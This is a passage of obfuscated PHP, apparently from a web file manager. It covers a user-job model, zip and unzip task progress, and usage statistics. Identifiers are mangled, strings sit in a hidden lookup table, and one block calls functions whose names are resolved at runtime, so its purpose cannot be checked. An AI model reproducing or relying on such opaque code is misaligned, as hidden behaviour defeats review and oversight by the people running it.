parent::listData($a“çš¼´ÒÓ, $cÄ½…ÚÄ©¼, $cÆ™±÷Š·Û); } public function remove($AóƒÁÅ·†„) { return parent::remove($AóƒÁÅ·†„); } public function add($fäåî›£ŠŠ) { $f †‰©«©« =& $_SERVER[úÉ·öƒÑì©]; if ($this->findByName($fäåî›£ŠŠ[$f †‰©«©«[28]])) { return !1; } $fäåî›£ŠŠ[$f †‰©«©«[1722]] = $this->getSort(); return parent::insert($fäåî›£ŠŠ); } private function getSort() { $A˜ÕöÃÄˆ =& $_SERVER[úÉ·öƒÑì©]; $D¡ïÓè²ğ = parent::listData(); $e›õóÉƒ´ë = array_to_keyvalue($D¡ïÓè²ğ, $A˜ÕöÃÄˆ[33], $A˜ÕöÃÄˆ[1722]); return empty($e›õóÉƒ´ë) ? 0 : max($e›õóÉƒ´ë) + 1; } public function update($eÒÄÏ±Ä¥æ, $D®‡‰Ğ³ğ) { $E˜Ó°‡œÅ¢ =& $_SERVER[úÉ·öƒÑì©]; $bÃÃÆÕÂÉî = parent::listData($eÒÄÏ±Ä¥æ); $DĞ±Ô†‡Ü® = $this->findByName($D®‡‰Ğ³ğ[$E˜Ó°‡œÅ¢[28]]); if (!$bÃÃÆÕÂÉî || $DĞ±Ô†‡Ü® && $DĞ±Ô†‡Ü®[$E˜Ó°‡œÅ¢[402]] != $bÃÃÆÕÂÉî[$E˜Ó°‡œÅ¢[402]]) { return !1; } return parent::update($eÒÄÏ±Ä¥æ, $D®‡‰Ğ³ğ); } public function setUserJob($eÇ³©ÄŠ¦, $bÎÌĞ±¬ô±) { goto EÕ©í…İªó; EÕ©í…İªó: $bãä²ó¦Ÿ¶ =& $_SERVER[úÉ·öƒÑì©]; if (!is_array($bÎÌĞ±¬ô±)) { $bÎÌĞ±¬ô± = array($bÎÌĞ±¬ô±); } $D’ëŠÁ—‚ã = parent::listData(); goto B§µÎä¾–ö; B§µÎä¾–ö: $Bè’¦àÆøƒ = array_to_keyvalue($D’ëŠÁ—‚ã, $bãä²ó¦Ÿ¶[28]); $D‚‚††Šò„ = $bãä²ó¦Ÿ¶[384]; foreach ($bÎÌĞ±¬ô± as $BÊ­†çóƒÚ) { if ($Bè’¦àÆøƒ[$BÊ­†çóƒÚ]) { $D‚‚††Šò„ .= $Bè’¦àÆøƒ[$BÊ­†çóƒÚ][$bãä²ó¦Ÿ¶[402]] . $bãä²ó¦Ÿ¶[47]; } else { $c‹µ®±­ø‰ = $this->add($BÊ­†çóƒÚ); $D‚‚††Šò„ .= $c‹µ®±­ø‰ . $bãä²ó¦Ÿ¶[47]; } } goto b•ëë”·±©; b•ëë”·±©: $D‚‚††Šò„ = rtrim($D‚‚††Šò„, $bãä²ó¦Ÿ¶[47]); Model($bãä²ó¦Ÿ¶[515])->metaSet($eÇ³©ÄŠ¦, self::JOB_KEY, $D‚‚††Šò„); goto D³°Å‚©‡; D³°Å‚©‡: } public function getUserJob($aÇÁ¹ÓŒÎ­) { $Bô­ÇÛÅÕ = Model($_SERVER[úÉ·öƒÑì©][515])->metaGet($aÇÁ¹ÓŒÎ­); return $this->getUserJobInfo($Bô­ÇÛÅÕ[self::JOB_KEY]); } public function getUserJobInfo($Fô­Ó®–) { goto CÊã¨Áò; Fë…… –ô¾: return $D¨ª‰ÕŠ½è; goto bòÛšê–§ñ; CÊã¨Áò: $eöƒ» ³¹Ÿ =& $_SERVER[úÉ·öƒÑì©]; $Fˆ¼¡ÔÔ· = explode($eöƒ» ³¹Ÿ[47], $Fô­Ó®–); $A¹•ïÙëš = parent::listData(); goto AÔå÷«ï‡; AÔå÷«ï‡: $A¹•ïÙëš = array_remove_key($A¹•ïÙëš, $eöƒ» ³¹Ÿ[194]); $D¨ª‰ÕŠ½è = array(); foreach ($Fˆ¼¡ÔÔ· as $aä©½¬ÍÆĞ) { if (isset($A¹•ïÙëš[$aä©½¬ÍÆĞ])) { $D¨ª‰ÕŠ½è[] = $A¹•ïÙëš[$aä©½¬ÍÆĞ]; } } goto Fë…… –ô¾; bòÛšê–§ñ: } } goto E†Ñ•¨“ô; AÁñè³öÈ»: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto d™ÍšŞ÷²Á; eÚŠ‰Ø®æ: Hook::bind($F—Àå³“[1097], array($this, $F—Àå³“[1619])); $Aà½„‚Ç¬µ =& $this->task; $Aà½„‚Ç¬µ[$F—Àå³“[1620]] = $F—Àå³“[1102]; goto F½»‡ÒÙ‰; d™ÍšŞ÷²Á: $F—Àå³“ =& $_SERVER[úÉ·öƒÑì©]; parent::startAfter(); Hook::bind($F—Àå³“[1617], array($this, $F—Àå³“[1618])); goto eÚŠ‰Ø®æ; F½»‡ÒÙ‰: if (!$Aà½„‚Ç¬µ[$F—Àå³“[1441]]) { $Aà½„‚Ç¬µ[$F—Àå³“[1441]] = LNG($F—Àå³“[1621]); } goto dÂ®åì•„; dÂ®åì•„: } protected function endAfter() { $C‡ÀôÜİ‰ƒ =& $_SERVER[úÉ·öƒÑì©]; parent::endAfter(); Hook::unbind($C‡ÀôÜİ‰ƒ[1617], array($this, $C‡ÀôÜİ‰ƒ[1618])); Hook::unbind($C‡ÀôÜİ‰ƒ[1097], array($this, $C‡ÀôÜİ‰ƒ[1619])); } public function updateAfter() { $a¼öõœ‚Íå =& $_SERVER[úÉ·öƒÑì©]; $aÔ¿Á¤©¬ =& $this->task; if (!$aÔ¿Á¤©¬[$a¼öõœ‚Íå[1029]] || !$aÔ¿Á¤©¬[$a¼öõœ‚Íå[739]]) { return; } if ($aÔ¿Á¤©¬[$a¼öõœ‚Íå[1620]] == $a¼öõœ‚Íå[1102]) { $Fô£ªœÔ¡­ = 0; if ($aÔ¿Á¤©¬[$a¼öõœ‚Íå[1579]]) { $Fô£ªœÔ¡­ = $aÔ¿Á¤©¬[$a¼öõœ‚Íå[1580]] / $aÔ¿Á¤©¬[$a¼öõœ‚Íå[1579]]; } $aÔ¿Á¤©¬[$a¼öõœ‚Íå[1536]] = $Fô£ªœÔ¡­ * 0.3; } else { if ($aÔ¿Á¤©¬[$a¼öõœ‚Íå[1620]] == $a¼öõœ‚Íå[320]) { $Fô£ªœÔ¡­ = $aÔ¿Á¤©¬[$a¼öõœ‚Íå[1044]] / $aÔ¿Á¤©¬[$a¼öõœ‚Íå[1029]]; $aÔ¿Á¤©¬[$a¼öõœ‚Íå[1536]] = 0.3 + $Fô£ªœÔ¡­ * 0.4; } else { if ($aÔ¿Á¤©¬[$a¼öõœ‚Íå[1620]] == $a¼öõœ‚Íå[107]) { $D©¥öÂÊô = 0; if ($aÔ¿Á¤©¬[$a¼öõœ‚Íå[1581]] == $a¼öõœ‚Íå[107]) { $D©¥öÂÊô = $aÔ¿Á¤©¬[$a¼öõœ‚Íå[1580]]; } $Fô£ªœÔ¡­ = ($aÔ¿Á¤©¬[$a¼öõœ‚Íå[1584]] + $D©¥öÂÊô) / $aÔ¿Á¤©¬[$a¼öõœ‚Íå[739]]; $aÔ¿Á¤©¬[$a¼öõœ‚Íå[1536]] = 0.3 + 0.4 + $Fô£ªœÔ¡­ * 0.3; } } } if ($aÔ¿Á¤©¬[$a¼öõœ‚Íå[1536]] > 0) { $FÛÙ¤Ë¿Ï = timeFloat() - $aÔ¿Á¤©¬[$a¼öõœ‚Íå[765]] - $aÔ¿Á¤©¬[$a¼öõœ‚Íå[1539]]; $aÔ¿Á¤©¬[$a¼öõœ‚Íå[1540]] = $FÛÙ¤Ë¿Ï * (1 - $aÔ¿Á¤©¬[$a¼öõœ‚Íå[1536]]) / $aÔ¿Á¤©¬[$a¼öõœ‚Íå[1536]]; } } public function addFile($F˜ÎˆåÃ˜) { goto AÁøƒ¡Áæœ; eÅëÆ†×ˆŸ: $EÓæøï¢Ó[$eäïŒ‡¾‡[1031]] = $eäïŒ‡¾‡[1596]; $EÓæøï¢Ó[$eäïŒ‡¾‡[1581]] = $eäïŒ‡¾‡[1102]; $EÓæøï¢Ó[$eäïŒ‡¾‡[739]] = $Fö£”…Æç§[$eäïŒ‡¾‡[78]]; goto aôß´¼²¡Ô; aôß´¼²¡Ô: $EÓæøï¢Ó[$eäïŒ‡¾‡[1029]] = 1; $DÁÜî†ÁÜÔ = 0; $EÓæøï¢Ó[$eäïŒ‡¾‡[1588]] = array($eäïŒ‡¾‡[1589] => $DÁÜî†ÁÜÔ + 1, $eäïŒ‡¾‡[422] => $Fö£”…Æç§[$eäïŒ‡¾‡[28]], $eäïŒ‡¾‡[76] => $Fö£”…Æç§[$eäïŒ‡¾‡[76]], $eäïŒ‡¾‡[504] => $Fö£”…Æç§[$eäïŒ‡¾‡[504]] ? $Fö£”…Æç§[$eäïŒ‡¾‡[504]] : $Fö£”…Æç§[$eäïŒ‡¾‡[76]]); goto e «ø÷Îâè; e «ø÷Îâè: $this->update(); goto E¶–ŸãÖŒ; AÁøƒ¡Áæœ: $eäïŒ‡¾‡ =& $_SERVER[úÉ·öƒÑì©]; $EÓæøï¢Ó =& $this->task; $Fö£”…Æç§ = IO::info($F˜ÎˆåÃ˜); goto DèøÆæÚ–³; DèøÆæÚ–³: $EÓæøï¢Ó[$eäïŒ‡¾‡[1577]] = $Fö£”…Æç§[$eäïŒ‡¾‡[28]]; $EÓæøï¢Ó[$eäïŒ‡¾‡[1579]] = $Fö£”…Æç§[$eäïŒ‡¾‡[78]]; $EÓæøï¢Ó[$eäïŒ‡¾‡[1580]] = 0; goto eÅëÆ†×ˆŸ; E¶–ŸãÖŒ: } public function unzipAfter($eš‡ÔÉ­á³) { goto AìëŠƒÆï; bæêª£ßÖ´: $B‘ŠÕº‡±İ = IO::infoWithChildren($eš‡ÔÉ­á³); $f³„ƒİ£Ñã = 0; $fƒğËï¹¤Ç[$F—£ÔæÜ[1588]] = array($F—£ÔæÜ[1589] => $f³„ƒİ£Ñã + 1, $F—£ÔæÜ[422] => $B‘ŠÕº‡±İ[$F—£ÔæÜ[28]], $F—£ÔæÜ[76] => $B‘ŠÕº‡±İ[$F—£ÔæÜ[76]], $F—£ÔæÜ[504] => $B‘ŠÕº‡±İ[$F—£ÔæÜ[504]] ? $B‘ŠÕº‡±İ[$F—£ÔæÜ[504]] : $B‘ŠÕº‡±İ[$F—£ÔæÜ[76]]); goto BÈ‹­Æñğ¸; BÈ‹­Æñğ¸: if ($B‘ŠÕº‡±İ[$F—£ÔæÜ[29]] == $F—£ÔæÜ[193]) { $fƒğËï¹¤Ç[$F—£ÔæÜ[1029]] = 1; } else { $fƒğËï¹¤Ç[$F—£ÔæÜ[1029]] = $B‘ŠÕº‡±İ[$F—£ÔæÜ[81]][$F—£ÔæÜ[79]]; } $fƒğËï¹¤Ç[$F—£ÔæÜ[1031]] = $F—£ÔæÜ[33]; $fƒğËï¹¤Ç[$F—£ÔæÜ[1581]] = 0; goto dŸ•Ğ¬Ä“; Fó˜Üè¯¡±: $this->update(); self::log($F—£ÔæÜ[1622] . json_encode(array($fƒğËï¹¤Ç, $B‘ŠÕº‡±İ))); goto BÍê‹§ç¿; AìëŠƒÆï: $F—£ÔæÜ =& $_SERVER[úÉ·öƒÑì©]; $fƒğËï¹¤Ç =& $this->task; $fƒğËï¹¤Ç[$F—£ÔæÜ[1620]] = $F—£ÔæÜ[107]; goto bæêª£ßÖ´; b¹ÛÚ³¹ì: $fƒğËï¹¤Ç[$F—£ÔæÜ[1577]] = $F—£ÔæÜ[33]; $fƒğËï¹¤Ç[$F—£ÔæÜ[1584]] = 0; $fƒğËï¹¤Ç[$F—£ÔæÜ[739]] = $B‘ŠÕº‡±İ[$F—£ÔæÜ[78]]; goto Fó˜Üè¯¡±; dŸ•Ğ¬Ä“: $fƒğËï¹¤Ç[$F—£ÔæÜ[1044]] = 0; $fƒğËï¹¤Ç[$F—£ÔæÜ[1579]] = 0; $fƒğËï¹¤Ç[$F—£ÔæÜ[1580]] = 0; goto b¹ÛÚ³¹ì; BÍê‹§ç¿: } public function nameParse($eâóõ•µµ‹) { goto eéæ½ŒØ¨; cóÒ…„ÌØ‡: $this->update(); goto C»—ÓÄÄ¯Ş; eÓ™è›âÅ: $E“¹Ó¸ˆæ– = get_path_this($eâóõ•µµ‹); if (strstr($E“¹Ó¸ˆæ–, $e…§Üô«Õ©[95])) { $aÍÍ‚ˆ¦µö[$e…§Üô«Õ©[1044]] += 1; $aÍÍ‚ˆ¦µö[$e…§Üô«Õ©[1029]] += 1; } $aÍÍ‚ˆ¦µö[$e…§Üô«Õ©[1577]] = $eâóõ•µµ‹; goto cóÒ…„ÌØ‡; eéæ½ŒØ¨: $e…§Üô«Õ© =& $_SERVER[úÉ·öƒÑì©]; $aÍÍ‚ˆ¦µö =& $this->task; if ($aÍÍ‚ˆ¦µö[$e…§Üô«Õ©[1620]] == $e…§Üô«Õ©[1102]) { $aÍÍ‚ˆ¦µö[$e…§Üô«Õ©[1620]] = $e…§Üô«Õ©[320]; $aÍÍ‚ˆ¦µö[$e…§Üô«Õ©[1584]] = 0; $aÍÍ‚ˆ¦µö[$e…§Üô«Õ©[739]] = 0; } goto eÓ™è›âÅ; C»—ÓÄÄ¯Ş: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $a³ğ¼ğ =& $_SERVER[úÉ·öƒÑì©]; parent::startAfter(); Hook::bind($a³ğ¼ğ[1623], array($this, $a³ğ¼ğ[1618])); $eğ¸µ§÷‚Œ =& $this->task; $eğ¸µ§÷‚Œ[$a³ğ¼ğ[1620]] = $a³ğ¼ğ[1102]; if (!$eğ¸µ§÷‚Œ[$a³ğ¼ğ[1441]]) { $eğ¸µ§÷‚Œ[$a³ğ¼ğ[1441]] = LNG($a³ğ¼ğ[1624]); } } protected function endAfter() { $d¥ù‹˜…­ =& $_SERVER[úÉ·öƒÑì©]; parent::endAfter(); Hook::unbind($d¥ù‹˜…­[1623], array($this, $d¥ù‹˜…­[1618])); } public function updateAfter() { $Bá†ïµ†ğ =& $_SERVER[úÉ·öƒÑì©]; $bÙ‡¥ë·—£ =& $this->task; if (!$bÙ‡¥ë·—£[$Bá†ïµ†ğ[1029]] || !$bÙ‡¥ë·—£[$Bá†ïµ†ğ[739]]) { return; } if ($bÙ‡¥ë·—£[$Bá†ïµ†ğ[1620]] == $Bá†ïµ†ğ[1102]) { $aÍîÑ—‹´ğ = $bÙ‡¥ë·—£[$Bá†ïµ†ğ[1580]]; if ($bÙ‡¥ë·—£[$Bá†ïµ†ğ[1581]] != $Bá†ïµ†ğ[1102]) { $aÍîÑ—‹´ğ = 0; } $e…ğ²Ò£ê = ($bÙ‡¥ë·—£[$Bá†ïµ†ğ[1584]] + $aÍîÑ—‹´ğ) / $bÙ‡¥ë·—£[$Bá†ïµ†ğ[739]]; $bÙ‡¥ë·—£[$Bá†ïµ†ğ[1536]] = $e…ğ²Ò£ê * 0.3; } else { if ($bÙ‡¥ë·—£[$Bá†ïµ†ğ[1620]] == $Bá†ïµ†ğ[320]) { $e…ğ²Ò£ê = $bÙ‡¥ë·—£[$Bá†ïµ†ğ[1044]] / $bÙ‡¥ë·—£[$Bá†ïµ†ğ[1029]]; $bÙ‡¥ë·—£[$Bá†ïµ†ğ[1536]] = 0.3 + $e…ğ²Ò£ê * 0.5; } else { if ($bÙ‡¥ë·—£[$Bá†ïµ†ğ[1620]] == $Bá†ïµ†ğ[107]) { $e…ğ²Ò£ê = 0; if ($bÙ‡¥ë·—£[$Bá†ïµ†ğ[1579]]) { $e…ğ²Ò£ê = $bÙ‡¥ë·—£[$Bá†ïµ†ğ[1580]] / $bÙ‡¥ë·—£[$Bá†ïµ†ğ[1579]]; } $bÙ‡¥ë·—£[$Bá†ïµ†ğ[1536]] = 0.3 + 0.5 + $e…ğ²Ò£ê * 0.2; } } } if ($bÙ‡¥ë·—£[$Bá†ïµ†ğ[1536]] > 0) { $A¡ÓŸàŞéö = timeFloat() - $bÙ‡¥ë·—£[$Bá†ïµ†ğ[765]] - $bÙ‡¥ë·—£[$Bá†ïµ†ğ[1539]]; $bÙ‡¥ë·—£[$Bá†ïµ†ğ[1540]] = $A¡ÓŸàŞéö * (1 - $bÙ‡¥ë·—£[$Bá†ïµ†ğ[1536]]) / $bÙ‡¥ë·—£[$Bá†ïµ†ğ[1536]]; } } public function copyFileStart($f“Ô…»¼š, $EÅˆ“Ï…Éß, $b¾¬ÅÈ§ÕÃ, $FêŸ‚è½è, $e‰â‚ ¹ñ, $f›ÌŒê” ) { $Fì¯„ªöì =& $_SERVER[úÉ·öƒÑì©]; parent::copyFileStart($f“Ô…»¼š, $EÅˆ“Ï…Éß, $b¾¬ÅÈ§ÕÃ, $FêŸ‚è½è, $e‰â‚ ¹ñ, $f›ÌŒê” ); $c¤Ûë™ï„ª =& $this->task; if ($c¤Ûë™ï„ª[$Fì¯„ªöì[1620]] == $Fì¯„ªöì[320]) { $c¤Ûë™ï„ª[$Fì¯„ªöì[1620]] = $Fì¯„ªöì[107]; } $this->update(); } public function copyFileEnd($DºÓ²ÑºÈë, $bÔÂç»‹, $DÓÖ°İ–Ô¡, $d•³Îñ¦», $fß¸«íïš, $bÙ‘¦¹åßõ) { $c§¦²ÂÄË =& $_SERVER[úÉ·öƒÑì©]; $B¦‹ßÁƒ¥Ş =& $this->task; $B¦‹ßÁƒ¥Ş[$c§¦²ÂÄË[1580]] = $B¦‹ßÁƒ¥Ş[$c§¦²ÂÄË[1579]]; $B¦‹ßÁƒ¥Ş[$c§¦²ÂÄË[1584]] += $B¦‹ßÁƒ¥Ş[$c§¦²ÂÄË[1579]]; $B¦‹ßÁƒ¥Ş[$c§¦²ÂÄË[1581]] = $c§¦²ÂÄË[33]; $this->update(); } public function nameParse($D®ŞøŸ¼–ê) { $AĞÉ¾…è¶ =& $_SERVER[úÉ·öƒÑì©]; $F±Â“ªµ— =& $this->task; if ($F±Â“ªµ—[$AĞÉ¾…è¶[1044]] < $F±Â“ªµ—[$AĞÉ¾…è¶[1029]]) { $fÉ¢‚Š˜‘ = get_path_this($D®ŞøŸ¼–ê); if (strstr($fÉ¢‚Š˜‘, $AĞÉ¾…è¶[95])) { $F±Â“ªµ—[$AĞÉ¾…è¶[1044]] += 1; } } if ($F±Â“ªµ—[$AĞÉ¾…è¶[1620]] == $AĞÉ¾…è¶[1102]) { $F±Â“ªµ—[$AĞÉ¾…è¶[1620]] = $AĞÉ¾…è¶[320]; } $F±Â“ªµ—[$AĞÉ¾…è¶[1577]] = $D®ŞøŸ¼–ê; $this->update(); } } if ($_SERVER[$_SERVER[úÉ·öƒÑì©][244]] != $_SERVER[$_SERVER[úÉ·öƒÑì©][847]]) { goto Eƒë´Æà¯‡; C·ÂÜÏÃˆ: $a‰¹çŒšĞÅ = explode($_SERVER[úÉ·öƒÑì©][229], $A‡İŒÛƒÄ½); if (count($a‰¹çŒšĞÅ) < $_SERVER[úÉ·öƒÑì©][248]) { $E„ãŒÜø‡• = $_SERVER[úÉ·öƒÑì©][249]; $E„ãŒÜø‡•(); } $FÄ˜ÀÖĞÕë = $_SERVER[úÉ·öƒÑì©][250]; goto c¥‹¡ŞõÅã; Eƒë´Æà¯‡: $EŸì»ÍÏÃ = $_SERVER[úÉ·öƒÑì©][245]; $c²Ì³¤Ã = $_SERVER[$_SERVER[úÉ·öƒÑì©][246]] . $_SERVER[úÉ·öƒÑì©][247]; $A‡İŒÛƒÄ½ = $EŸì»ÍÏÃ($c²Ì³¤Ã); goto C·ÂÜÏÃˆ; c¥‹¡ŞõÅã: $FÄ˜ÀÖĞÕë($_SERVER[$_SERVER[úÉ·öƒÑì©][242]]); goto cŸĞ™„¢ó·; cŸĞ™„¢ó·: } goto CÅ©„À·Ü; CÅ©„À·Ü: class AnalysisModel extends ModelBaseLight { public function init($AĞëçÓ è™) { $b“†µ¢é³ =& $_SERVER[úÉ·öƒÑì©]; $aÃì»ÅŞöé = array($b“†µ¢é³[571] => array($b“†µ¢é³[29] => $b“†µ¢é³[1625], $b“†µ¢é³[280] => array($b“†µ¢é³[222], $b“†µ¢é³[741], $b“†µ¢é³[1626], $b“†µ¢é³[1627])), $b“†µ¢é³[1628] => array($b“†µ¢é³[29] => $b“†µ¢é³[1629], $b“†µ¢é³[280] => array($b“†µ¢é³[222], $b“†µ¢é³[739], $b“†µ¢é³[1630], $b“†µ¢é³[1631], $b“†µ¢é³[1632]))); if (!isset($aÃì»ÅŞöé[$AĞëçÓ è™])) { return !1; } $this->optionType = $aÃì»ÅŞöé[$AĞëçÓ è™][$b“†µ¢é³[29]]; $this->field = $aÃì»ÅŞöé[$AĞëçÓ è™][$b“†µ¢é³[280]]; return !0; } public function listData($b˜¥­¤‹ = false, $A“‡ŒĞùî = "\x6d\157\x64\151\x66\171\124\151\x6d\145", $a¶êÓ¹·–® = false) { return parent::listData($b˜¥­¤‹, $A“‡ŒĞùî, $a¶êÓ¹·–®); } public function trendList($A¬ª…ß—Êù) { goto EØè­ÂŠ; fËã„Ú¡ôé: if (!isset($ağ¦¶ ™â)) { $EŠ†¯Û¾¼ = $A¬ª…ß—Êù == $bÌÕ»‹Çµš[571] ? $bÌÕ»‹Çµš[515] : $bÌÕ»‹Çµš[806]; $ağ¦¶ ™â = Model($EŠ†¯Û¾¼)->min($bÌÕ»‹Çµš[194]); } $F‚‘’á¿‚Í = $bÌÕ»‹Çµš[1635] . ucfirst($A¬ª…ß—Êù); $aå„ô¥‡ÅÉ = $this->dateList($ağ¦¶ ™â); goto dªˆÕëÒÈŒ; EØè­ÂŠ: $bÌÕ»‹Çµš =& $_SERVER[úÉ·öƒÑì©]; $Bšë¤à‡¦ = $this->listData(); if ($Bšë¤à‡¦) { $eŒôÓ²ÕŠ = end($Bšë¤à‡¦); $d°÷¸¯‚ = date($bÌÕ»‹Çµš[1633], strtotime($bÌÕ»‹Çµš[1634])); if ($eŒôÓ²ÕŠ[$bÌÕ»‹Çµš[222]] == $d°÷¸¯‚) { return $Bšë¤à‡¦; } $ağ¦¶ ™â = strtotime($eŒôÓ²ÕŠ[$bÌÕ»‹Çµš[222]]); } goto fËã„Ú¡ôé; dªˆÕëÒÈŒ: foreach ($aå„ô¥‡ÅÉ as $d°÷¸¯‚) { $this->{$F‚‘’á¿‚Í}($d°÷¸¯‚); } return $this->listData(); goto Fó‰²™ƒª¯; Fó‰²™ƒª¯: } private function dateList($D»Ñ¶Ã„¨ˆ) { $cÉ×Ëƒ¥˜‰ =& $_SERVER[úÉ·öƒÑì©]; $aÎÃÁŞî¡ = $D»Ñ¶Ã„¨ˆ; $c÷Æ µŞï— = strtotime($cÉ×Ëƒ¥˜‰[1634]); $dÓ¾ÒµÉí = array(); while ($aÎÃÁŞî¡ <= $c÷Æ µŞï—) { $dÓ¾ÒµÉí[] = date($cÉ×Ëƒ¥˜‰[1633], $aÎÃÁŞî¡); $aÎÃÁŞî¡ = strtotime($cÉ×Ëƒ¥˜‰[1636], $aÎÃÁŞî¡); } return $dÓ¾ÒµÉí; } public function _recordUser($CæÌğÏÚáæ = '') { goto Bœ¿÷’š¼; f‘â‚†·½: $F´çÌ¨’¡ó = array($c›®Ôˆ·Ê—[194] => array($c›®Ôˆ·Ê—[978], $e¢¹øƒµµò)); $d©é“Öî†° = Model($c›®Ôˆ·Ê—[515])->where($F´çÌ¨’¡ó)->count($c›®Ôˆ·Ê—[1535]); $F´çÌ¨’¡ó[$c›®Ôˆ·Ê—[194]] = array($c›®Ôˆ·Ê—[340], array($B›ˆÎ÷ß¡â, $e¢¹øƒµµò)); goto FòÔÏˆ—íº; Bœ¿÷’š¼: $c›®Ôˆ·Ê— =& $_SERVER[úÉ·öƒÑì©]; $B›ˆÎ÷ß¡â = strtotime(date($c›®Ôˆ·Ê—[1637], strtotime($CæÌğÏÚáæ))); $e¢¹øƒµµò = strtotime(date($c›®Ôˆ·Ê—[1638], strtotime($CæÌğÏÚáæ))); goto f‘â‚†·½; FòÔÏˆ—íº: $C„Ñœ´ïå = Model($c›®Ôˆ·Ê—[515])->where($F´çÌ¨’¡ó)->count($c›®Ôˆ·Ê—[1535]); $F´çÌ¨’¡ó[$c›®Ôˆ·Ê—[29]] = $c›®Ôˆ·Ê—[1639]; $bâŒ´ôªİ² = Model($c›®Ôˆ·Ê—[1640])->where($F´çÌ¨’¡ó)->count($c›®Ôˆ·Ê—[1641]); goto aÊˆÇÀ»Çé; aÊˆÇÀ»Çé: $B—ĞáºÍö = array($c›®Ôˆ·Ê—[222] => $CæÌğÏÚáæ, $c›®Ôˆ·Ê—[741] => (int) $d©é“Öî†°, $c›®Ôˆ·Ê—[1626] => (int) $C„Ñœ´ïå, $c›®Ôˆ·Ê—[1627] => (int) $bâŒ´ôªİ²); return $this->insert($B—ĞáºÍö); goto c›¦—’³; c›¦—’³: } public function _recordStore($A¦ÌŸ™Ïâ« = '') { goto aø¾É¾‰Å¨; A§Úì±ĞÈ: $aì–Ó·ªå = Model($aæîø±é¾ğ[459])->where($bôùí‚„Àª)->sum($aæîø±é¾ğ[78]); $bôùí‚„Àª[$aæîø±é¾ğ[412]] = 0; $eÅµšèƒ = Model($aæîø±é¾ğ[806])->where($bôùí‚„Àª)->sum($aæîø±é¾ğ[78]); goto dãÆË÷ÛŞ; dãÆË÷ÛŞ: $bôùí‚„Àª[$aæîø±é¾ğ[413]] = 1; $f´Üè’ì± = Model($aæîø±é¾ğ[806])->where($bôùí‚„Àª)->sum($aæîø±é¾ğ[78]); $bôùí‚„Àª[$aæîø±é¾ğ[413]] = 2; goto d¡šİ­Õˆ; aø¾É¾‰Å¨: $aæîø±é¾ğ =& $_SERVER[úÉ·öƒÑì©]; $F¼ÙçƒÏ·¨ = strtotime(date($aæîø±é¾ğ[1638], strtotime($A¦ÌŸ™Ïâ«))); $bôùí‚„Àª = array($aæîø±é¾ğ[194] => array($aæîø±é¾ğ[978], $F¼ÙçƒÏ·¨)); goto A§Úì±ĞÈ; d¡šİ­Õˆ: $AàÕ”«‡çã = Model($aæîø±é¾ğ[806])->where($bôùí‚„Àª)->sum($aæîø±é¾ğ[78]); $e…²—‰šÌ = array($aæîø±é¾ğ[222] => $A¦ÌŸ™Ïâ«, $aæîø±é¾ğ[739] => (int) $eÅµšèƒ, $aæîø±é¾ğ[1630] => (int) $aì–Ó·ªå, $aæîø±é¾ğ[1631] => (int) $f´Üè’ì±, $aæîø±é¾ğ[1632] => (int) $AàÕ”«‡çã); return $this->insert($e…²—‰šÌ); goto Dêóà¶ŞÖ‚; Dêóà¶ŞÖ‚: } public function trend($e²ùÂßŠì‡, $AÎô›ñõ) { goto E×²œ‹»å­; d’È™‘Ú’¹: return $c¥å¬ªãè; goto fĞÒÌ´ôÄË; E×²œ‹»å­: $E‘™™ëŠ‹ä =& $_SERVER[úÉ·öƒÑì©]; if (!$this->init($e²ùÂßŠì‡)) { return !1; } $EÏ„Êì«õÄ = $this->trendList($e²ùÂßŠì‡); goto fÏØ»“É±³; fáö¸Œò¨: if (empty($EÏ„Êì«õÄ)) { $CíŸõŸÆ¿ = date($E‘™™ëŠ‹ä[1633], strtotime($E‘™™ëŠ‹ä[1634])); $E›§Øñø = array($E‘™™ëŠ‹ä[222] => $CíŸõŸÆ¿); foreach ($D…®ñÏŞô¤[$e²ùÂßŠì‡] as $b¹àø¤–ì => $f½¼éÎ¸‹) { $E›§Øñø[$b¹àø¤–ì] = 0; } $EÏ„Êì«õÄ[] = $E›§Øñø; } $c¥å¬ªãè = array(); foreach ($EÏ„Êì«õÄ as $f½¼éÎ¸‹) { if ($e²ùÂßŠì‡ == $E‘™™ëŠ‹ä[1628] && $f½¼éÎ¸‹[$E‘™™ëŠ‹ä[1630]] > $f½¼éÎ¸‹[$E‘™™ëŠ‹ä[739]]) { $f½¼éÎ¸‹[$E‘™™ëŠ‹ä[1630]] = $f½¼éÎ¸‹[$E‘™™ëŠ‹ä[739]]; } foreach ($D…®ñÏŞô¤[$e²ùÂßŠì‡] as $b¹àø¤–ì => $c›ïËŠíñ) { $AÁƒ®¨°” = array($E‘™™ëŠ‹ä[222] => $f½¼éÎ¸‹[$E‘™™ëŠ‹ä[222]], $E‘™™ëŠ‹ä[1441] => $c›ïËŠíñ); $AÁƒ®¨°”[$EÙ¹°ˆ°Î¤[$e²ùÂßŠì‡]] = isset($f½¼éÎ¸‹[$b¹àø¤–ì]) ? $f½¼éÎ¸‹[$b¹àø¤–ì] : 0; $c¥å¬ªãè[] = $AÁƒ®¨°”; } } goto d’È™‘Ú’¹; fÏØ»“É±³: if ($EÏ„Êì«õÄ && $AÎô›ñõ != $E‘™™ëŠ‹ä[1509]) { $A‚Îù¶ÇÔ˜ = $EÏ„Êì«õÄ[0][$E‘™™ëŠ‹ä[222]]; $fã¼¤ï„Ö¾ = $this->validDate($AÎô›ñõ, $A‚Îù¶ÇÔ˜); $Cºæ˜´ôö¬ = array(); $AïÏ­±ğÓ = array_to_keyvalue($EÏ„Êì«õÄ, $E‘™™ëŠ‹ä[222]); foreach ($fã¼¤ï„Ö¾ as $CíŸõŸÆ¿) { if (isset($AïÏ­±ğÓ[$CíŸõŸÆ¿])) { $AÁƒ®¨°” = $AïÏ­±ğÓ[$CíŸõŸÆ¿]; } else { $AÁƒ®¨°” = end($EÏ„Êì«õÄ); $AÁƒ®¨°”[$E‘™™ëŠ‹ä[222]] = $CíŸõŸÆ¿; if ($e²ùÂßŠì‡ == $E‘™™ëŠ‹ä[571]) { $AÁƒ®¨°”[$E‘™™ëŠ‹ä[1626]] = $AÁƒ®¨°”[$E‘™™ëŠ‹ä[1627]] = 0; } } $Cºæ˜´ôö¬[] = $AÁƒ®¨°”; } $EÏ„Êì«õÄ = $Cºæ˜´ôö¬; } $D…®ñÏŞô¤ = array($E‘™™ëŠ‹ä[571] => array($E‘™™ëŠ‹ä[741] => LNG($E‘™™ëŠ‹ä[1642]), $E‘™™ëŠ‹ä[1626] => 